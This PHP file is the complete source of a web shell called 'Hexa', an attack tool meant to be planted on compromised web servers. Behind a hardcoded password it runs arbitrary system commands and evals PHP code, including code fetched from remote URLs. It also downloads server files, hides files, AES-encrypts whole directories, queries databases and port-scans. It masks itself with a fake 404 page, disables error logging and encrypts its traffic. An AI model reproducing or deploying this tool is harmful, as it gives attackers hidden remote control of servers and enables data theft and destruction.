<?php
/**
 * Hexa web shell
 *
 * @version 1.0
 * @author  Nico Duitsmann (3v1l_un1c0rn)
 * @license GNU General Public License Version 3
 */

$shellName = basename(__FILE__); // basename of this file

if ( php_sapi_name() == 'cli' )
    die("Cli mode not supported.\n");

// set ini options
@ini_set('error_reporting', 1);
@ini_set('set_time_limit', 0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);

// ui options
define('UI_BG', '#ffffff'); // ui background color
define('UI_FC', '#333333'); // ui foreground color
define('UI_BC', '#00acc1'); // ui bold color

echo '<link rel="icon" href="https://png.icons8.com/color/100/000000/hexagon.png">';
echo '<style>html { background-color:'.UI_BG.'; color:'.UI_FC.';}strong { color:'.UI_BC.'; }</style>';

// define shell constants
define('PROTECT_PWD', '123456789');
define('SESSION_PWD', '12345');
define('SHELL_NAME', 'Hexa');
define('SHELL_AUTHOR', 'Nico Duitsmann');
define('SHELL_VERSION', '1.0');

// encryption mode ( POST )
if (!empty($_POST)) {
    define('ENC_MODE', true);
    define('SECRET', '~z13VeNG:WhdPb^N5U');
    define('IV', '3g&e35gW');
} elseif ( !empty($_GET) ) {
    define('ENC_MODE', false);
    echo '<title>'.SHELL_NAME.'('.$_SERVER['HTTP_HOST']-') @'.$_SERVER['SERVER_ADMIN'].'</title>';
}
define('SHELL_HELP',"
> ".
SHELL_NAME." supports both, GET and POST requests.
> Note: Only post request are encrypted. (status: ".var_export(ENC_MODE, true).")

Basic GET syntax:
-----------------

    {$shellName}?session_pwd=<strong>PASSWORD</strong>&shell=<strong>COMMAND</strong>[ARG1,ARG2...]

    PASSWORD                        Session password.
    COMMAND                         Command to execute to.

Available commands:
-------------------

    <strong>Shell commands:</strong>

    help                            Show this help.
    remove                          Remove shell from machine.

    <strong>File operations:</strong>
    
    get[FILE]                       Download file from this machine.
    urlget[URL,NEW]                 Download file from url to this machine.
    hide[FILE/DIR]                  Hide directory or file.
    delete[FILE/DIR]                Delete file or folder.
    create[FILE]                    Create blank file.
    copy[OLD,NEW]                   Copy file or folder.
    rename[OLD,NEW]                 Rename a file or folder.
    view[FILE]                      View file content.
    replace[FILE,CODE/URL]          Replace file content with custom code.
    encrypt[OBJ,SECRET,IV]          Try to encrypt file or folder with AES.
    decrypt[OBJ,SECRET,IV]          Try to encrypt file or folder with AES.
    finfo[FILE]                     Show file information.
    find[PATTERN,OBJ]               Find pattern in strings, files or directory's.

    <strong>System and db operations:</strong>

    shutdown 						Shutdown system.
    tasklist                        Show list of running processes.
    taskkill[TASK]                  Try to kill task.
    sysinfo                         Show advanced system information.
    geoinfo                         Show geoip information.
    phpinfo                         Show php information.
    query[QUERY,USER,PASS,DB]       Execute mysql query.
    eval[CODE/RAW_URL]              Evaluate a string as PHP code or run from raw url.
    
    <strong>Network:</strong>
    
    pscan[HOST,RANGE]               Perform port scan. Example range: 0-80000
");
define('EXIT_MESSAGE', "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>
<hr>
<address>".$_SERVER['SERVER_SIGNATURE']."</address>
</body></html>
<style>html {background-color:white;color:black;}</style>");

/**
 * Return server's operating system.
 * @return string
 */
$serverOs = function () {
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
        return 'win';
    else
        return 'unix';
}; define('SERVER_OS', $serverOs);

/**
 * Return's cpu usage for each core.
 * @return string
 */
function getCpuUsage() {
	if ( function_exists('sys_getloadavg') ) {
	    $cores = sys_getloadavg();
	    $x = "";
	    foreach ( $cores as $core ) {
	        $x .= $core."% ";
	    }
	    return $x;
	} else return false;
}

/**
 * Execute's system command.
 * @param $cmd
 * @return bool
 */
function execCommand ($cmd) {
    $prefered = 'shell_exec';
    $functions = 'exec passthru proc_open system';

    if ( !function_exists($prefered) ) {
        foreach (explode(' ', $functions) as $func) {
            if ( function_exists($func) ) {
                return @$func($cmd);
            }
        }
    } else {
        return @$prefered($cmd);
    }
    return false;
};

/**
 * Encrypt/decrypt data using AES 256 CBC.
 * @param $action
 * @param $data
 * @param $secret
 * @param $iv
 * @param string $enc_method
 * @return bool|string
 */
function encryption($action, $data, $secret, $iv, $enc_method = 'AES-256-CBC') {
    $output = false;
    $key = hash('sha256', $secret);
    $iv = substr(hash('sha256', $iv), 0, 16);

    switch ($action) {
        case 'encrypt':
            $output = openssl_encrypt($data, $enc_method, $key, 0, $iv);
            break;
        case 'decrypt':
            $output = openssl_decrypt($data, $enc_method, $key, 0, $iv);
            break;
        default: return $output;
    }
    return $output;
}

/**
 * Class UI
 */
class UI {
    /**
     * Print code formatted message.
     * @param $message
     */
    static public function printMsg($message) {
        if ( ENC_MODE )
            echo encryption("encrypt", $message, SECRET, IV);
        else
            echo "<pre>$message</pre>";
    }

    /**
     * Exit shell.
     * @param $exitMessage
     */
    static public function shellExit($exitMessage) {
        die(self::printMsg($exitMessage));
    }
}

/**
 * Class PatternSearch
 */
class PatternSearch {

    public $pattern;
    public $inputData;
    public $matches;

    /**
     * PatternSearch constructor.
     * @param $pattern
     * @param $inputData
     */
    function __construct($pattern, $inputData) {
        $this->pattern = $pattern;
        $this->matches = array();
        $this->initSearch($inputData);
    }

    /**
     * Return an array as result with matching file, position and line.
     * @param $source
     * @param $found
     * @param $pos
     * @param string $file
     */
    private function returnResult($source, $found, $pos, $file = "") {
        $replaced =
            str_replace($found, "<span style='color:red'><strong>$found</strong></span>", $source);

        $result = array(
            "file" => $file,
            "pos" => $pos,
            "line" => $replaced,
        );
        array_push($this->matches, $result);
    }

    /**
     * Search matching pattern in string.
     * @param $string
     * @param $data
     * @param string $file
     */
    public function stringSearch($string, $data, $file = "") {
        $pos = strpos($data, $string);

        if ( $pos !== false )
            $this->returnResult($data, $string, $pos, $file);
    }

    /**
     * Search matching regex in string.
     * @param $regex
     * @param $data
     * @return mixed
     */
    public function regexSearch($regex, $data) {
        preg_match($regex, $data, $matches, PREG_OFFSET_CAPTURE);
        return $matches; // TODO work with match array
    }

    /**
     * Search matching pattern in file.
     * @param $file
     * @param $pattern
     * @param bool $searchWithRegex
     */
    public function fileSearch($file, $pattern, $searchWithRegex = false) {
        $handle = fopen($file, "r");
        while ( $data = fgets($handle) ) {
            if ( $searchWithRegex ) {
                $this->regexSearch($pattern, $data);
            } else {
                $this->stringSearch($pattern, $data, $file);
            }
        }
        fclose($handle);
    }

    /**
     * Recursively search directory for matching pattern.
     * @param $pattern
     * @param $dir
     * @param bool $searchWithRegex
     */
    public function dirSearch($pattern, $dir, $searchWithRegex = false) {
        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator(
                $dir, \RecursiveDirectoryIterator::SKIP_DOTS
            ),
            \RecursiveIteratorIterator::SELF_FIRST,
            \RecursiveIteratorIterator::CATCH_GET_CHILD
        );

        foreach ($iterator as $file => $dir) {
            if ( !$dir->isDir() ) {
                $this->fileSearch($file, $pattern, $searchWithRegex);
            }
        }
    }

    /**
     * Get input type (file or dir).
     * @param $data
     * @return int
     */
    private function getType($data) {
        if ( is_file($data) )
            return 1;
        elseif ( is_dir($data) )
            return 2;
        else return 3;
    }

    /**
     * Initialize new search.
     * @param $inputData
     */
    private function initSearch($inputData) {
        $pattern = $this->pattern;
        switch ( $this->getType($inputData) ) {
            case 1:
                $this->fileSearch($inputData, $pattern);
                break;
            case 2:
                $this->dirSearch($pattern, $inputData);
                break;
            case 3:
                $this->stringSearch($pattern, $inputData);
                break;
        }
    }
}

/**
 * Class FileOperations
 */
class FileOperations {

    /**
     * Convert sizes.
     * @param $size
     * @return string
     */
    static public function convert($size)
    {
        $unit = array('b','kb','mb','gb','tb','pb');
        return @round($size/pow(1024,($i=floor(log($size,1024)))),2).' '.$unit[$i];
    }

    /**
     * Get (download) file from this machine.
     * @param $file
     */
    static public function get($file) {
        if (file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename='.basename($file));
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            ob_clean();
            flush();
            readfile($file);
            exit;
        } else UI::shellExit('$file not found');
    }

    /**
     * Save file from url to this machine.
     * @param $url
     * @param $new
     */
    static public function urlGet($url, $new) {
        UI::printMsg("Try to download $url to $new");

        $dest = preg_replace('/\s+/', '', $new);
        $data = file_get_contents($url);

        file_put_contents($dest, $data);
        if ( file_exists($dest) )
            UI::printMsg("Saved to $dest");
        else
            UI::printMsg("Error while downloading $url");
    }

    /**
     * Hide file or folder.
     * @param $obj
     */
    static public function hide($obj) {
        UI::printMsg("Try to hide $obj");
        if ( SERVER_OS !== 'win' )
            self::rename($obj, '.'.$obj);
        else
            execCommand('attrib -h '.$obj);
    }

    /**
     * Unhide file or folder.
     * @param $obj
     */
    static public function unhide($obj) {
        UI::printMsg("Try to unhide $obj");
        if ( SERVER_OS !== 'win' )
            self::rename('.'.$obj, $obj);
        else
            execCommand('attrib -h '.$obj);
    }

    /**
     * Delete file or folder.
     * @param $obj
     */
    static public function delete($obj) {
        if ( unlink($obj) )
            UI::printMsg("$obj was successfully deleted");
        else
            UI::printMsg("Error while deleting file $obj");
    }

    /**
     * Create file or folder.
     * @param $file
     */
    static public function create($file) {
        $cf = fopen($file, 'w') or UI::shellExit("Can't create file $file");
        fclose($cf);
        UI::printMsg("Successful created $file");
    }

    /**
     * Copy  file or folder.
     * @param $file
     * @param $new
     */
    static public function copy($file, $new) {
        if ( copy($file, $new) )
            UI::printMsg("$file was successfully copied to $new");
        else
            UI::printMsg("Error while copying file $file");
    }

    /**
     * Rename file or folder.
     * @param $old
     * @param $new
     */
    static public function rename($old, $new) {
        if ( rename($old, $new) )
            UI::printMsg("$old was successfully renamed to $new");
        else
            UI::printMsg("Error while renaming file $old");
    }

    /**
     * View content of file.
     * @param $file
     */
    static public function view($file) {
        UI::printMsg(htmlspecialchars(file_get_contents($file)));
    }

    /**
     * Replace file's content with custom code.
     * @param $file
     * @param $code
     */
    static public function replace($file, $code) {
        file_put_contents($file, $code);
        UI::printMsg("'$code' was written to $file");
    }

    /**
     * Encrypt file using AES 256 CBC.
     * @param $file
     * @param $secret
     * @param $iv
     */
    static public function fileEncrypt($file, $secret, $iv) {
        UI::printMsg("Encrypt file $file [secret:$secret, iv:$iv]");

        $content = file_get_contents($file);
        $encContent = encryption('encrypt', $content, $secret, $iv);

        file_put_contents($file, $encContent);
        self::rename($file, "$file.enc");
    }

    /**
     * Decrypt file using AES 256 CBC.
     * @param $encFile
     * @param $secret
     * @param $iv
     */
    static public function fileDecrypt($encFile, $secret, $iv) {
        UI::printMsg("Decrypt file $encFile [secret:$secret, iv:$iv]");

        $encContent = file_get_contents($encFile);
        $decContent = encryption('decrypt', $encContent, $secret, $iv);

        file_put_contents($encFile, $decContent);

        $newFn = explode('.enc', $encFile)[0];
        self::rename($encFile, $newFn);
    }

    /**
     * Encrypt all file's within directory using AES 256 CBC.
     * @param $dir
     * @param $secret
     * @param $iv
     */
    static public function dirEncrypt($dir, $secret, $iv) {
        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator(
                $dir, \RecursiveDirectoryIterator::SKIP_DOTS
            ),
            \RecursiveIteratorIterator::SELF_FIRST,
            \RecursiveIteratorIterator::CATCH_GET_CHILD
        );

        foreach ($iterator as $file => $dir) {
            if (!$dir->isDir()) {
                self::fileEncrypt($file, $secret, $iv);
            }
        }
    }

    /**
     * Decrypt all file's within directory using AES 256 CBC.
     * @param $encDir
     * @param $secret
     * @param $iv
     */
    static public function dirDecrypt($encDir, $secret, $iv) {
        $iterator = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator(
                $encDir, \RecursiveDirectoryIterator::SKIP_DOTS
            ),
            \RecursiveIteratorIterator::SELF_FIRST,
            \RecursiveIteratorIterator::CATCH_GET_CHILD
        );

        foreach ($iterator as $file => $dir) {
            if (!$dir->isDir()) {
                self::fileDecrypt($file, $secret, $iv);
            }
        }
    }

    /**
     * Show file information.
     * @param $file
     */
    static public function finfo($file) {
        $fileInfo = "File information for <strong>$file</strong>:
        
Basename:               ".basename($file)."
Last access:            ".date("d F Y H:i:s", fileatime($file))."
Last changed:           ".date("d F Y H:i:s", filectime($file))."
Group:                  ".filegroup($file)."
File inode:             ".fileinode($file)."
Modification time:      ".date("d F Y H:i:s", filemtime($file))."
Owner:                  ".fileowner($file)."
Permissions:            ".fileperms($file)."
Size:                   ".filesize($file)."
Type:                   ".filetype($file)."
";
        UI::printMsg($fileInfo);
    }

    /**
     * Find pattern in data.
     * @param $pattern
     * @param $data
     */
    static public function find($pattern, $data) {
        $search = new PatternSearch($pattern, $data);
        foreach ($search->matches as $match) {
            // echo "<pre>".$match["file"]." ".$match["pos"].": ".$match["line"]."</pre>";
            UI::printMsg($match["file"]." ".$match["pos"].": ".$match["line"]);
        }
    }
}

/**
 * Class System
 */
class System {

	static public function shutdown() {
		//TODO
	}

    /**
     * Show list of running processes
     */
    static public function tasklist() {
        if ( SERVER_OS !== 'win' )
            UI::printMsg(shell_exec("ps -U root -u root -N"));
        else
            execCommand('tasklist');
    }

    /**
     * Try to kill a system task.
     * @param $pid
     * @param int $sigTerm
     */
    static public function taskkill($pid, $sigTerm=9) {
        if ( SERVER_OS !== 'win' )
            UI::printMsg(shell_exec("kill -$sigTerm $pid"));
        else
            execCommand('taskkill /PID '.$pid);
    }

    /**
     * Show system information
     */
    static public function sysinfo() {
        $sysinfo = "
System information for ".$_SERVER['HTTP_HOST'].":
        
Software:        ".$_SERVER['SERVER_SOFTWARE']."
User agent:      ".$_SERVER['HTTP_USER_AGENT']."
HTTP-accept:     ".$_SERVER['HTTP_ACCEPT']."
HTTP-cookie:     ".$_SERVER['HTTP_COOKIE']."
Document root:   ".$_SERVER['DOCUMENT_ROOT']."
Server admin:    ".$_SERVER['SERVER_ADMIN']."
Remote port:     ".$_SERVER['REMOTE_PORT']."
Gateway iface:   ".$_SERVER['GATEWAY_INTERFACE']."
        ";

        UI::printMsg($sysinfo);
    }

    /**
     * Show machine's geo ip information
     */
    static public function geoinfo() {
        $ip    = file_get_contents('https://api.ipify.org');
        $data  = file_get_contents('http://freegeoip.net/json/'.$ip);
        $json = json_decode($data);

        $geoinfo = "
System information for ".$_SERVER['HTTP_HOST'].":

Ip address:     ".$json->{'ip'}."
Country code:   ".$json->{'country_code'}."
Country name:   ".$json->{'country_name'}."
Region name:    ".$json->{'region_code'}."
Region code:    ".$json->{'region_name'}."
City:           ".$json->{'city'}."
Zip code:       ".$json->{'zip_code'}."
Timezone:       ".$json->{'time_zone'}."
Latitude:       ".$json->{'latitude'}."
Longitude:      ".$json->{'longitude'}."
Metro code:     ".$json->{'metro_code'}."
Map link:       http://www.openstreetmap.org/#map=13/".$json->{'latitude'}."/".$json->{'longitude'}."
        ";

        UI::printMsg(utf8_decode($geoinfo));
    }

    /**
     * Show phpInfo
     */
    static public function phpInfo() {
        UI::printMsg(phpinfo());
    }

    /**
     * Execute mysql query.
     * @param $query
     * @param $username
     * @param $password
     * @param $database
     */
    static public function execQuery($query, $username, $password, $database) {

        $pass = str_replace("'", "", $password);
        $db = str_replace("'", "", $database);

        $conn = mysqli_connect('127.0.0.1', $username, $pass, $db);
        if ( $conn == false )
            UI::shellExit('Could not connect to mysql. '.mysqli_connect_error());

        $result = mysqli_query($conn, $query);

        if ( $result ) {
            // start drawing table
            echo "<pre>";
            $sizes = array();
            $row = mysqli_fetch_assoc($result);

            foreach ( $row as $key => $value ) {
                $sizes[$key] = strlen($key);
            }

            while ( $row = mysqli_fetch_assoc($result) ) {
                foreach ( $row as $key=>$value ) {
                    $length = strlen($value);
                    if ( $length > $sizes[$key] ) $sizes[$key] = $length;
                }
            }
            mysqli_data_seek($result, 0);

            // top
            foreach ( $sizes as $length ) {
                echo "+".str_pad("",$length + 2,"-");
            }
            echo "+<br>";

            // column names
            $row = mysqli_fetch_assoc($result);
            foreach ( $row as $key => $value ) {
                echo "| ";
                echo str_pad($key,$sizes[$key] + 1);
            }
            echo "|<br>";

            // line under column names
            foreach ( $sizes as $length ) {
                echo "+".str_pad("",$length + 2,"-");
            }
            echo "+<br>";

            //output data
            do {
                foreach( $row as $key=>$value ){
                    echo "| ";
                    echo str_pad($value,$sizes[$key] + 1);
                }
                echo "|<br>";
            } while ( $row = mysqli_fetch_assoc($result) );

            // bottom
            foreach ( $sizes as $length ) {
                echo "+".str_pad("",$length + 2,"-");
            }
            echo "+<br>";

            echo "</pre>";
        } else  {
            UI::shellExit('Error while executing query');
            mysqli_error($conn);
        }
        mysqli_close($conn);
    }
}

/**
 * Class Network
 */
class Network {
    /**
     * Scan for open ports.
     * @param $host
     * @param $range
     */
    static public function portScan($host, $range) {
        if ( empty($host) )
            $host = '127.0.0.1';
        else $host = $host;

        UI::printMsg("Perform port scan for $host ($range)");

        $start = explode("-", $range)[0];
        $end   = explode("-", $range)[1];

        for ( $p = $start; $p < $end; $p++ ) {
            if ( @fsockopen($host, $p, $errorno, $errorstr, 0.1) ) {
                $srvName = getservbyport($p, 'tcp');
                if ( empty($srvName) ) $srvName = 'unknown';
                UI::printMsg("[$host] open: <strong>$p</strong>(".$srvName.")");
            }
        }
    }
}

/**
 * Class ShellCore
 */
class ShellCore {

    private $shellCommand;
    private $shellPassword;
    private $useEnc;

    /**
     * ShellCore constructor.
     * @param $shellCommand
     * @param $shellPassword
     * @param bool $useEnc
     */
    function __construct($shellCommand, $shellPassword, $useEnc = false) {
        if ( $useEnc ) {
            $this->shellCommand["session_pwd"] = encryption("decrypt", $shellCommand["session_pwd"], SECRET, IV);
            $this->shellCommand["shell"] = encryption("decrypt", $shellCommand["shell"], SECRET, IV);
        }
        $this->shellCommand = $shellCommand;
        $this->shellPassword = $shellPassword;
        $this->useEnc = $useEnc;
        $this->processAuth($this->shellCommand, $this->shellPassword);
    }

    /**
     * Process shell authorisation.
     * @param $shellCommand
     * @param $shellPassword
     */
    private function processAuth($shellCommand, $shellPassword) {
        if ( $this->useEnc )
            $sessionPwd = encryption("decrypt", $shellCommand['session_pwd'], SECRET, IV);
        else
            $sessionPwd = $shellCommand['session_pwd'];
        if ( $sessionPwd != $shellPassword ) {
            die(EXIT_MESSAGE);
        } else {
            // UI::printMsg("Successful authenticated.", "green");
            $this->processShellCmd($this->shellCommand);
        }
    }

    /**
     * Check if input contains command.
     * @param $input
     * @param $command
     * @return bool
     */
    private function isCommand($input, $command) {
        if ( strncmp($input, $command, strlen($command)) === 0 )
            return true;
        else
            return false;
    }

    /**
     * Process commands.
     * @param $cmd
     */
    private function processShellCmd($cmd) {
        if ( $this->useEnc )
        {
            $command = encryption('decrypt', utf8_decode(htmlspecialchars($cmd['shell'])), SECRET, IV);
        }
        else
        {
            $command = utf8_decode(htmlspecialchars($cmd["shell"]));
        }

        // navbar
        UI::printMsg(
            '<strong>'.SHELL_NAME.'</strong> WebShell | Client: '.$_SERVER['SERVER_SOFTWARE'].
            ' ('.file_get_contents('https://api.ipify.org').') - Local server time: '.date('H:i:s').
            ' ('.date_default_timezone_get().') - CPU: '.getCpuUsage().'- Mem: '.FileOperations::convert(memory_get_usage(true)));
        echo "<hr>";
        UI::printMsg("Output for <strong>".$command."</strong>");

        // start handling commands
        if ( $this->isCommand($command, 'help') )
        {
            UI::printMsg(SHELL_HELP);
        }
        elseif ( $this->isCommand($command, 'remove') )
        {
            $confirmPwd = str_replace("]", "", explode("[", $command)[1]);
            if ( $confirmPwd == PROTECT_PWD ) {
                unlink(basename(__FILE__));
                UI::printMsg("Shell was deleted.");
            } else UI::shellExit("You nedd to confirm removing shell by entering 'PROTECT_PWD'");
        }
        elseif ( $this->isCommand($command, 'get') )
        {
            $file = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::get($file);
        }
        elseif ( $this->isCommand($command, 'urlget') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $url = $args[0];
            $new = $args[1];
            FileOperations::urlGet($url, $new);
        }
        elseif ( $this->isCommand($command, 'hide') )
        {
            $obj = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::hide($obj);
        }
        elseif ( $this->isCommand($command, 'unhide') )
        {
            $obj = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::unhide($obj);
        }
        elseif ( $this->isCommand($command, 'delete') )
        {
            $obj = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::delete($obj);
        }
        elseif ( $this->isCommand($command, 'create') )
        {
            $file = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::create($file);
        }
        elseif ( $this->isCommand($command, 'copy') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $file = $args[0];
            $new = $args[1];
            FileOperations::copy($file, $new);
        }
        elseif ( $this->isCommand($command, 'rename') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $old = $args[0];
            $new = $args[1];
            FileOperations::rename($old, $new);
        }
        elseif ( $this->isCommand($command, 'view') )
        {
            $file = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::view($file);
        }
        elseif ( $this->isCommand($command, 'replace') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $file = $args[0];
            $arg2 = $args[1];
            if (filter_var($arg2, FILTER_VALIDATE_URL) === false) {
                FileOperations::replace($file, $arg2);
            } else {
                UI::printMsg("URL");
                FileOperations::replace($file, file_get_contents($arg2));
            }
        }
        elseif ( $this->isCommand($command, 'encrypt') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $obj = $args[0];
            $secret = $args[1];
            $iv = $args[2];

            if ( is_file($obj) )
                FileOperations::fileEncrypt($obj, $secret, $iv);
            elseif ( is_dir($obj) )
                FileOperations::dirEncrypt($obj, $secret, $iv);
        }
        elseif ( $this->isCommand($command, 'decrypt') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $obj = $args[0];
            $secret = $args[1];
            $iv = $args[2];

            if ( is_file($obj) )
                FileOperations::fileDecrypt($obj, $secret, $iv);
            elseif ( is_dir($obj) )
                FileOperations::dirDecrypt($obj, $secret, $iv);
        }
        elseif ( $this->isCommand($command, 'finfo') )
        {
            $file = str_replace("]", "", explode("[", $command)[1]);
            FileOperations::finfo($file);
        }
        elseif ( $this->isCommand($command, 'find') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $pattern = $args[0];
            $data = preg_replace('/\s+/', '', $args[1]);
            FileOperations::find($pattern, $data);
        }
        elseif ( $this->isCommand($command, 'tasklist') )
        {
            System::tasklist();
        }
        elseif ( $this->isCommand($command, 'taskkill') )
        {
            $task = str_replace("]", "", explode("[", $command)[1]);
            System::taskkill($task);
        }
        elseif ( $this->isCommand($command, 'sysinfo') )
        {
            System::sysinfo();
        }
        elseif ( $this->isCommand($command, 'geoinfo') )
        {
            System::geoinfo();
        }
        elseif ( $this->isCommand($command, 'phpinfo') )
        {
            System::phpInfo();
        }
        elseif ( $this->isCommand($command, 'query') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $query = $args[0];
            $user = $args[1];
            $pass = $args[2];
            $db = $args[3];
            System::execQuery($query, $user, $pass, $db);
        }
        elseif ( $this->isCommand($command, 'eval') )
        {
            $arg = str_replace("]", "", explode("[", $command)[1]);

            if (filter_var($arg, FILTER_VALIDATE_URL) === false) {
                UI::printMsg("> <strong>Raw code:</strong>");
                UI::printMsg($arg);
                UI::printMsg("> <strong>Evaluated code:</strong>");
                echo "<pre>";
                eval("?><?".$arg."?><?");
                echo "</pre>";
            } else {
                $code = file_get_contents($arg);
                UI::printMsg("> <strong>Raw code:</strong>");
                UI::printMsg($code);
                UI::printMsg("> <strong>Evaluated code:</strong>");
                echo "<pre>";
                eval("?><?".$code."?><?");
                echo "</pre>";
            }
        }
        elseif ( $this->isCommand($command, 'pscan') )
        {
            $args = explode(",", str_replace("]", "", explode("[", $command)[1]));
            $host  = $args[0];
            $range = $args[1];
            Network::portScan($host, $range);
        }
        else
        {
            $out = execCommand($command);
            if ( $out == '' )
                UI::shellExit('Wrong command. Request help to see available commands.');
            else
                UI::printMsg($out);
        }
    }
}

// initialize new shell instance
$shell = new ShellCore($_REQUEST, SESSION_PWD, ENC_MODE);
?>
